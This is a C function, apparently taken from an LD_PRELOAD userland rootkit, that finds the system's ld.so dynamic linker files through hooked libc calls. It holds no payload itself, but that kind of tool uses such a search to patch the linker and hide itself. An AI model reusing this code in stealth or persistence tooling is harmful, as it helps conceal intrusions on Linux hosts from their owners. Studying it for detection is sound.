/* searches all ldhomes directories for a maximum of maxlds ld.so & returns an array of char pointers to each valid ld.so.
 * the pointer allf is updated with the number of located ld.so.
 * if a search result is a symlink it is skipped. */
char **ldfind(int *allf, int maxlds){
    char **foundlds = malloc(sizeof(char*)*maxlds);
    if(!foundlds) return NULL;
    
    char *home, *ldname, *namedup, *nametok;
    int found=0, isanld=0;
    struct dirent *dir;
    DIR *dp;
    struct stat sbuf;
    size_t pathsize;

    hook(COPENDIR, CREADDIR, C__LXSTAT);

    for(int i=0; i<sizeofarr(ldhomes) && found<maxlds; i++){
        home = ldhomes[i];
        
        dp = call(COPENDIR, home);
        if(dp == NULL) continue;

        while((dir = call(CREADDIR, dp)) != NULL && found<maxlds){
            if(!strncmp(".", dir->d_name, 1) || strncmp("ld-", dir->d_name, 3))
                continue;

            ldname = dir->d_name;
            namedup = strdup(ldname);
            nametok = strtok(namedup, ".");
            while(nametok != NULL && isanld == 0){
                !strcmp("so\0", nametok) ? isanld = 1 : 0;
                nametok = strtok(NULL, ".");
            }
            free(namedup);

            if(!isanld)
                continue;
            else isanld = 0;

            pathsize = strlen(home)+strlen(ldname)+2;
            char path[pathsize];
            snprintf(path, sizeof(path), "%s/%s", home, ldname);

            memset(&sbuf, 0, sizeof(struct stat));
            if((long)call(C__LXSTAT, _STAT_VER, path, &sbuf) < 0 || S_ISLNK(sbuf.st_mode))
                continue;

            foundlds[found] = malloc(pathsize);
            strncpy(foundlds[found++], path, pathsize);
        }

        closedir(dp);
    }

    *allf = found;
    return foundlds;
}